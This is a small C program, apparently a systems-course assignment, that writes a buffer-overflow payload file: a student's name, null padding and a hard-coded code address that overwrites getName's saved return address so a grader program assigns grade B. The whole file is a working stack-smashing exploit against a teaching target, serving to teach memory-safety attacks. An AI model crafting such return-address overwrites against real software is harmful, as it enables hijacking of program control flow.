/* Produces a file called dataB with the student name, a nullbyte,
   padding to overrun the stack, and the address of the instruction in
   main to get a B, the latter of which will overwrite getName's stored
   x30. */
#include <stdio.h>

/* Prints a buffer overun string to the file dataB that causes the
grader executable to give a grade B to the name Ibraheem Amin. This
function takes in no command line arguments, returns 0 */
int main()
{
    FILE *psFile;
    int i;
    /* Address in text where B is assigned to grade. */
    unsigned long ulData = 0x400890;
    psFile = fopen("dataB", "w");

    /* First 13 bytes are the name */
    fprintf(psFile, "%s", "Ibraheem Amin");
    /* Nullbyte at the end of the name */
    putc(0, psFile);
    /* Filler nullbytes */
    for (i = 0; i < 34; i++)
    {
        putc(0, psFile);
    }
    /* Address in text where B is assigned to grade which overwrites the
       return address of getName() */
    (void)fwrite(&ulData, sizeof(unsigned long), 1, psFile);

    fclose(psFile);
    return 0;
}